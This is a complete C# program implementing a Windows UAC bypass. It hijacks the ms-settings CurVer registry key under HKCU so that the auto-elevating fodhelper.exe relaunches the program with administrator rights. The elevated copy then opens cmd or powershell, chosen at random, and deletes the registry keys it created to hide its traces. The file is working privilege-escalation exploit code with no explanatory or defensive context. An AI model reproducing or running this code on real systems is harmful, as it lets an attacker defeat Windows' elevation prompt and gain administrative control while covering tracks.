using Microsoft.Win32;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System;

namespace FodhelperSet
{
    internal class Program
    {
        static void Main(string[] args)
        {
			
			string curver = "ms.fdhlp2";
			
            if (args.Length == 0)
            {

                RegistryKey myKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\" + curver + @"\Shell\Open\command", true);
				
                string strExeFilePath = Assembly.GetExecutingAssembly().Location;
				myKey.SetValue("", strExeFilePath + " 1", RegistryValueKind.String);//pointing to the this file
				myKey.Close();
				
				myKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\CurVer", true);
                myKey.SetValue("", curver, RegistryValueKind.String);
				myKey.Close();
				
				string cmd = @"c:\Windows\System32\fodhelper.exe";
                l(cmd);
								
            }

            else
            {
				
				//a bit of randomization	
				int i = new Random().Next(0,5);
				string[] x = {"cmd","powershell","cmd","powershell","cmd","powershell"};
				l(x[i]);
				
				
				//clean 
				using (RegistryKey myK = Registry.CurrentUser.OpenSubKey(@"Software\Classes", writable: true))
				{
					if (myK != null) {
						myK.DeleteSubKeyTree("ms-settings");
						myK.DeleteSubKeyTree(curver);
					}
     
				}

            }           
        }
		

        public static void l(string a)
        {
            var proc1 = new ProcessStartInfo();
            proc1.UseShellExecute = true; //https://stackoverflow.com/questions/3596259/elevating-privileges-doesnt-work-with-useshellexecute-false
			proc1.LoadUserProfile = true;
            proc1.FileName = a;
            Process.Start(proc1);
		
        }
		
    }
}
